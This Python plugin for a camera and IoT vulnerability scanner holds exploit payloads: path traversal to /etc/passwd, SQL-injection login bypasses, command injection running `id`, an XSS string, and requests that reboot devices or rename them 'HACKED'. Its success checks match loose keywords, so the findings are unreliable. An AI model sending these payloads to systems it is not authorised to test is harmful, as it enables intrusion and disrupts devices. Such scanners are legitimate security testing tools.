"""
Vulnerability Scanner Plugin for Gridland
Detects known CVEs and security vulnerabilities in IP cameras and IoT devices
"""
import requests
import re
from typing import List, Dict, Any
from lib.plugins import ScannerPlugin, Finding
from lib.core import ScanTarget


class VulnerabilityScannerPlugin(ScannerPlugin):
    """
    Comprehensive vulnerability detection for IP cameras and IoT devices.
    Tests for known CVEs, authentication bypasses, and common exploits.
    """
    
    def can_scan(self, target: ScanTarget) -> bool:
        """Check if target has web ports for vulnerability testing"""
        vuln_ports = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]
        return any(p.port in vuln_ports for p in target.open_ports)

    # Known vulnerability signatures and exploit paths
    VULNERABILITY_TESTS = {
        # Directory Traversal Vulnerabilities
        "directory_traversal": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo&-usr=admin&-pwd=admin&-file=../../../../etc/passwd",
                "/ISAPI/Security/sessionLogin/capabilities?username=admin'%20or%20'1'='1&password=admin",
                "/cgi-bin/nobody/VerifyCode.cgi?account=admin'or'1=1'%23",
                "/../../../../../../../etc/passwd",
                "/cgi-bin/supervisor.cgi?action=logincheck&user=admin&password=../../../../etc/passwd%00",
                "/axis-cgi/jpg/image.cgi?resolution=640x480&dummy=../../../../../../../etc/passwd"
            ],
            "indicators": ["root:", "daemon:", "nobody:", "www-data:", "passwd"],
            "severity": "critical",
            "description": "Directory traversal vulnerability allows reading system files"
        },
        
        # Authentication Bypass Vulnerabilities  
        "auth_bypass": {
            "paths": [
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/ISAPI/Security/userCheck",
                "/cgi-bin/hi3510/checkuser.cgi?&-name=admin&-passwd=",
                "/axis-cgi/admin/param.cgi?action=list&group=Network",
                "/admin/admin_testip.php",
                "/cgi-bin/operator/admin.cgi",
                "/sony/admin",
                "/panasonic/admin"
            ],
            "indicators": ["<admin>", "authentication", "login successful", "admin panel", "configuration"],
            "severity": "high",
            "description": "Authentication bypass allows unauthorized access"
        },
        
        # Command Injection Vulnerabilities
        "command_injection": {
            "paths": [
                "/cgi-bin/hi3510/test.cgi?cmd=cat%20/etc/passwd",
                "/cgi-bin/nobody/Machine.cgi?action=shellcommand&command=id",
                "/ISAPI/System/deviceInfo?devInfo=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e",
                "/axis-cgi/admin/param.cgi?action=update&root.Network.Interface.I0.IPv4.Address=`id`",
                "/cgi-bin/supervisor.cgi?action=&command=id;"
            ],
            "indicators": ["uid=", "gid=", "groups=", "root", "daemon"],
            "severity": "critical", 
            "description": "Command injection vulnerability allows remote code execution"
        },
        
        # Information Disclosure
        "info_disclosure": {
            "paths": [
                "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
                "/ISAPI/System/deviceInfo",
                "/axis-cgi/admin/param.cgi?action=list",
                "/cgi-bin/nobody/Machine.cgi?action=list",
                "/sony/common/appInfo.cgi",
                "/panasonic/config/config_backup.bin",
                "/admin/system_log.cgi",
                "/cgi-bin/supervisor.cgi?action=get&category=system.*"
            ],
            "indicators": ["version", "model", "serial", "firmware", "password", "key"],
            "severity": "medium",
            "description": "Information disclosure reveals sensitive system details"
        },
        
        # CSRF Vulnerabilities
        "csrf": {
            "paths": [
                "/admin/admin_testip.php?ip=127.0.0.1",
                "/cgi-bin/nobody/Machine.cgi?action=reboot",
                "/ISAPI/System/reboot",
                "/axis-cgi/admin/param.cgi?action=update&root.System.Name=HACKED"
            ],
            "indicators": ["success", "rebooting", "updated", "changed"],
            "severity": "medium",
            "description": "CSRF vulnerability allows unauthorized actions"
        }
    }

    # Brand-specific vulnerability tests
    BRAND_SPECIFIC_VULNS = {
        "hikvision": [
            "/ISAPI/Security/userCheck",  # CVE-2017-7921
            "/ISAPI/Streaming/channels/1/picture",  # Unauthorized access
            "/ISAPI/System/deviceInfo?format=json",  # Info disclosure
        ],
        "dahua": [
            "/current_config/passwd",  # CVE-2013-6117
            "/cgi-bin/snapshot.cgi",  # Unauthorized snapshots
            "/dms?nowprofileid=1",  # Stream access
        ],
        "axis": [
            "/axis-cgi/jpg/image.cgi",  # Unauthorized image access
            "/axis-cgi/admin/param.cgi?action=list",  # Config access
            "/axis-cgi/serverreport.cgi",  # System info
        ],
        "sony": [
            "/sony/common/appInfo.cgi",  # Version disclosure
            "/sony/config",  # Config access
            "/command/inquiry.cgi?inq=system",  # System inquiry
        ]
    }

    def scan(self, target: ScanTarget) -> List[Finding]:
        """Perform comprehensive vulnerability scanning"""
        findings = []
        
        for port_result in target.open_ports:
            if port_result.port not in [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]:
                continue
                
            protocol = "https" if port_result.port in [443, 8443] else "http"
            base_url = f"{protocol}://{target.ip}:{port_result.port}"
            
            # Test generic vulnerabilities
            for vuln_type, vuln_data in self.VULNERABILITY_TESTS.items():
                findings.extend(self._test_vulnerability(base_url, vuln_type, vuln_data))
            
            # Test brand-specific vulnerabilities
            if target.brand:
                brand_lower = target.brand.lower()
                if brand_lower in self.BRAND_SPECIFIC_VULNS:
                    findings.extend(self._test_brand_vulnerabilities(base_url, brand_lower, target.brand))
        
        return findings

    def _test_vulnerability(self, base_url: str, vuln_type: str, vuln_data: Dict[str, Any]) -> List[Finding]:
        """Test a specific vulnerability type"""
        findings = []
        
        for path in vuln_data["paths"]:
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 Security Scanner'}
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check for vulnerability indicators
                    for indicator in vuln_data["indicators"]:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{vuln_data['description']} - {vuln_type}",
                                severity=vuln_data["severity"],
                                url=url,
                                data={
                                    "vulnerability_type": vuln_type,
                                    "indicator_found": indicator,
                                    "response_snippet": content[:200]
                                }
                            )
                            findings.append(finding)
                            break  # Only report once per path
                            
            except requests.RequestException:
                continue
                
        return findings

    def _test_brand_vulnerabilities(self, base_url: str, brand: str, brand_display: str) -> List[Finding]:
        """Test brand-specific known vulnerabilities"""
        findings = []
        
        for path in self.BRAND_SPECIFIC_VULNS.get(brand, []):
            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 Security Scanner'}
                )
                
                # Different success criteria for different brands
                success_indicators = {
                    "hikvision": ["<ResponseStatus>", "deviceInfo", "userCheck"],
                    "dahua": ["admin:", "config", "passwd"],
                    "axis": ["root.", "Network", "System"],
                    "sony": ["appInfo", "sony", "version"]
                }
                
                if response.status_code == 200:
                    content = response.text.lower()
                    indicators = success_indicators.get(brand, ["admin", "config", "system"])
                    
                    for indicator in indicators:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{brand_display}-specific vulnerability found",
                                severity="high",
                                url=url,
                                data={
                                    "vulnerability_type": f"{brand}_specific",
                                    "brand": brand_display,
                                    "indicator_found": indicator
                                }
                            )
                            findings.append(finding)
                            break
                            
            except requests.RequestException:
                continue
                
        return findings

    def get_description(self) -> str:
        """Get plugin description"""
        return "Comprehensive vulnerability scanner for IP cameras and IoT devices"